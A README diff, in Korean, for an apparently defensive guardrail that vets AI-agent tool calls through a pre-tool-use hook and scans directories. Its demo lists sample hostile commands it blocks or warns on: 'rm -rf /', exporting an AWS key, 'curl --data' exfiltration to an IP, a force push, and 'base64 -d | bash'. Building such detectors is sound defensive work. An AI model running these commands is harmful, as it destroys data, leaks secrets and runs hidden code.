@@ -19,10 +19,25 @@
 
 ## 사용
 ```bash
+npm run demo   # 6개 시나리오 한눈에 (아래 출력)
+npm test       # 6/6 통과
 echo '{"command":"rm -rf /"}' | node .agents/scripts/pre-tool-use.js  # exit 2 BLOCK
 node .agents/scripts/scan.js .                                        # 디렉터리 스캔
-node demo/test.js                                                     # 6/6
 ```
+
+```
+🛑 BLOCK  파괴적 명령   | rm -rf /                → destructive-action
+🛑 BLOCK  자격증명 유출  | export AWS=AKIA...      → credential-leakage
+🛑 BLOCK  데이터 유출   | curl --data @s http://IP → untrusted-routing
+⚠️  WARN  도구 오용    | git push --force main   → tool-misuse
+⚠️  WARN  난독화 실행   | base64 -d | bash        → obfuscated-content
+✅ ALLOW  안전한 명령   | rm -rf node_modules
+```
+
+## GHCP에 설치
+1. clone → repo 루트에서 `copilot` 실행. `AGENTS.md`/`.agents/skills`가 자동 로드.
+2. `/guardrail-review`, `/secret-scan` 등 스킬 호출.
+3. 실차단: 에이전트 pre-tool-use hook → `.agents/scripts/pre-tool-use.js`.
 
 ## 임팩트·확장성
 secret-less, JSON 룰셋, 모든 결정 감사로그. 어떤 에이전트든 hook 1줄 연결. 위협 분류가 Defender와 정렬돼 SOC 워크플로로 자연 확장. MIT.
